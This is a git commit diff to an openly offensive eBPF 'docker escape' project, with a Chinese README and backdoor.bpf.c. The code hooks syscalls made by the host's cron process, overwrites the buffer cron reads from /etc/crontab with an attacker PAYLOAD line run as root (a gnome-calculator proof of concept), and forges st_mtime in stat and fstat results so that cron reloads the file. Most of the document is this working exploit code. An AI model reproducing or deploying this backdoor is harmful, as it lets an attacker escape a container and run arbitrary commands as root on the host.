c881d09b4ce2cec053f0d35764c19bfcdec59d04
shenyuan <junchaoluan@gmail.com>
2022-02-05 15:31:54 +0800

    update

--- README.md
+++ README.md
@@ -1,6 +1,6 @@
 # eBPF docker逃逸
 基于[libbpf](https://github.com/libbpf/libbpf-bootstrap/tree/master/examples/c)搭的
 
-通过劫持openat newfstat close read 这几个系统调用，实现劫持cron读取的/etc/crontab，欺骗宿主机中的cron执行攻击者预定的命令，实现逃逸
+通过劫持openat stat fstat close read 这几个系统调用，实现劫持cron读取的/etc/crontab，欺骗宿主机中的cron执行攻击者预定的命令，实现逃逸
 
-在我的博客上有[原理和代码的详解](https://drivertom.blogspot.com/2022/01/ebpfdocker.html)
+原理参考 [使用 eBPF 逃逸容器技术分析与实践](https://paper.seebug.org/1750)
--- code/backdoor.bpf.c
+++ code/backdoor.bpf.c
@@ -6,12 +6,6 @@
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_core_read.h>
 #include <bpf/bpf_tracing.h>
-/*
-struct timespec {
-	 long int tv_sec;
-	 long tv_nsec;
-};
-*/
 
 struct pidandfd {
 	unsigned int pid;
@@ -25,24 +19,15 @@ struct {
     __type(value, unsigned int);
 } map_fds SEC(".maps");
 
-/*
-// Map to hold the File Descriptors from 'openat' calls
-struct {
-    __uint(type, BPF_MAP_TYPE_HASH);
-    __uint(max_entries, 8192);
-    __type(key, unsigned int);
-    __type(value, unsigned int);
-} map_fds SEC(".maps");
-*/
-
 #define MAX_FILE_NAME_LEN 256
 #define INTERESTING_FILENAME "/etc/crontab"
 //char PAYLOAD[]="* * * * * root  /bin/bash -c \"echo 114514 >> /tmp/naive \" \n#";
-char PAYLOAD[]="* * * * * root  sudo -i -u apu  \"/bin/bash\" -c \"DISPLAY=:0 gnome-calculator\"& \n#";
+char PAYLOAD[]="* * * * * root  sudo -i -u skysider  \"/bin/bash\" -c \"DISPLAY=:0 gnome-calculator\"& \n#";
 static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,unsigned int pid);
 static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsigned int pid);
 static __inline int handle_exit_close(struct pt_regs *regs,unsigned long ret,unsigned int pid);
-static __inline int handle_exit_newfstatat(struct pt_regs *regs,unsigned long ret,unsigned int pid);
+static __inline int handle_exit_stat(struct pt_regs *regs, unsigned long ret, unsigned int pid);
+static __inline int handle_exit_fstat(struct pt_regs *regs, unsigned long ret, unsigned int pid);
 
 
 static __inline int memcmp(const void* s1, const void* s2, size_t cnt);
@@ -51,8 +36,7 @@ static __inline int memcmp(const void* s1, const void* s2, size_t cnt);
 #define TARGET_NAME "cron"
 
 
-
-SEC("raw_tracepoint/sys_exit")
+SEC("raw_tp/sys_exit")
 int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
 {
   unsigned int syscall_id=0;
@@ -65,6 +49,7 @@ int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
   //过滤掉不是目标进程的进程
   if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
 	return 0;
+  bpf_printk("BPF triggered from PID %d, name %s.\n", pid, comm);
   switch (syscall_id)
     {
 		case 0:
@@ -73,14 +58,50 @@ int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
 		case 3:
 			handle_exit_close(regs,ret,pid);
 			break;
+		case 4: 
+			handle_exit_stat(regs, ret, pid);
+			break;
+		case 5:
+			handle_exit_fstat(regs, ret, pid);
+			break;
 		case 257:
             handle_exit_openat(regs,ret,pid);
             break;
-		case 262:
-			handle_exit_newfstatat(regs,ret,pid);
 	}
 }
 
+static __inline int handle_exit_stat(struct pt_regs *regs, unsigned long ret, unsigned int pid)
+{
+	char buf[0x40];
+	struct stat *statbuf_ptr;
+	__kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
+	bpf_probe_read_str(buf,sizeof(buf), ((char *)PT_REGS_PARM1_CORE(regs)));
+	// bpf_printk("exit_stat %s:%d\n",buf,pid);
+	if (memcmp(buf, INTERESTING_FILENAME, sizeof(INTERESTING_FILENAME)))
+		return 0;
+	bpf_printk("exit_stat %s:%d\n",buf,pid);
+	statbuf_ptr= PT_REGS_PARM2_CORE(regs);
+	bpf_probe_write_user(&statbuf_ptr->st_mtime, &crontab_st_mtime, sizeof(crontab_st_mtime));
+
+}
+
+static __inline int handle_exit_fstat(struct pt_regs *regs, unsigned long ret, unsigned int pid)
+{
+	unsigned int fd=PT_REGS_PARM1_CORE(regs);
+	struct pidandfd pidfd={.pid=pid, .fd=fd};
+	struct stat *statbuf_ptr;
+	__kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
+	unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
+	if(exists==NULL)
+		return 0;
+	bpf_printk("exit_fstat pid:%d fd:%d\n",pid,fd);
+	if(*exists==1)
+	{
+		bpf_printk("fstat! target fd:%d\n",fd);
+		statbuf_ptr= PT_REGS_PARM2_CORE(regs);
+		bpf_probe_write_user(&statbuf_ptr->st_mtime, &crontab_st_mtime, sizeof(crontab_st_mtime));
+	}
+}
 
 static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,unsigned int pid)
 {
@@ -91,9 +112,11 @@ static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,un
 	bpf_probe_read_str(buf,sizeof(buf), ((char *)PT_REGS_PARM2_CORE(regs)));
 	//bpf_printk("exit_openat %s:%d fd:%d\n",buf,pid,retfd);
 	//如果文件名不匹配我们感兴趣的文件名就不做了睡大觉
+
 	if (memcmp(buf, INTERESTING_FILENAME, sizeof(INTERESTING_FILENAME)))
 		return 0;
 	//是我们感兴趣的文件，存入map_fds
+	bpf_printk("exit_openat %s:%d fd:%d\n",buf,pid,retfd);
 	struct pidandfd pidfd={.pid=pid, .fd=retfd};
 	unsigned int one=1;
 	bpf_map_update_elem(&map_fds, &pidfd, &one, BPF_ANY);
@@ -119,13 +142,13 @@ static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsi
 	unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
 	if(exists==NULL)
 		return 0;
-	//bpf_printk("exit_read pid:%d fd:%d targetfd:%d\n",pid,fd,*targetfdptr);
+	bpf_printk("exit_read pid:%d fd:%d\n",pid,fd);
 	if(*exists==1)
 	{
-		//bpf_printk("READING! target fd:%d read %d bytes\n",fd,readlen);
+		bpf_printk("READING! target fd:%d read %d bytes\n",fd,readlen);
 		if(readlen>sizeof(PAYLOAD))
 		{
-			//bpf_printk("writing payload\n");
+			bpf_printk("writing payload\n");
 			char* buf=(char *)PT_REGS_PARM2_CORE(regs);
 			bpf_probe_write_user((void *)(buf),PAYLOAD, sizeof(PAYLOAD));
 		}
@@ -134,53 +157,6 @@ static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsi
 
 }
 
-static __inline int handle_exit_newfstatat(struct pt_regs *regs,unsigned long ret,unsigned int pid)
-{
-	//struct stat statbufobj;
-	char buf[0x40];
-	//读文件名，这里VSCODE会给这一行报错，看来果真还是不够行
-	bpf_probe_read_str(buf,sizeof(buf), ((char *)PT_REGS_PARM2_CORE(regs)));
-	
-	int thisistarget=0;
-	//有可能是先open了这个文件，然后再fstatat，所以文件名那儿没有显示，非常野蛮
-	//读dirfd
-	unsigned int dirfd=PT_REGS_PARM1_CORE(regs);
-	struct pidandfd pidfd={.pid=pid, .fd=dirfd};
-	unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
-	if(exists!=NULL && *exists==1)
-	{
-		thisistarget=1;
-		bpf_printk("yes,target! method:open->fstat\n");
-	}
-
-	if(!thisistarget)
-	{
-		//如果文件名不匹配我们感兴趣的文件名就不做了睡大觉
-		if (memcmp(buf, INTERESTING_FILENAME, sizeof(INTERESTING_FILENAME)))
-		{
-			bpf_printk("not target\n");
-			return 0;
-		}
-		thisistarget=1;
-		bpf_printk("yes,target! method:fstat\n");
-	}
-	
-	if(thisistarget)
-	{
-		struct stat *statbuf_ptr=PT_REGS_PARM3_CORE(regs);
-
-		bpf_printk("exit_newfstatat %s:%d\n",buf,pid);
-
-		__kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
-
-
-		//bpf_probe_read_user((void*)&statbufobj,sizeof(statbufobj), PT_REGS_PARM3_CORE(regs) );
-		//bpf_printk("target statbuf.st_size:%ld\n",statbuf.st_size);
-		bpf_printk("Time MaGic +1s!\n");
-		bpf_probe_write_user(&(statbuf_ptr->st_mtime), &crontab_st_mtime, sizeof(crontab_st_mtime));
-	}
-
-}
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
 
 
